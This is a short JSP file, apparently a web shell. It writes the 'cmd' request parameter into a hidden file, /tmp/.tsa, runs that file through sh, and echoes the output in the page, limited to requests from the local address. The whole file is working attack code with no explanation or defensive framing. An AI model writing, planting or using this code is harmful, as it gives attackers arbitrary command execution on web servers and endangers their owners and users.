<%@ page import="java.util.*,java.io.*"%>
<% if (request.getRemoteAddr().equals("127.0.0.1")) {
        PrintWriter pw = new PrintWriter(new FileOutputStream("/tmp/.tsa"));
        pw.println(request.getParameter("cmd") + " 2>&1"); pw.close();
        DataInputStream b = new DataInputStream(Runtime.getRuntime().exec("sh /tmp/.tsa").getInputStream());
        String s; while ((s = b.readLine()) != null ) out.println(s);
} %>
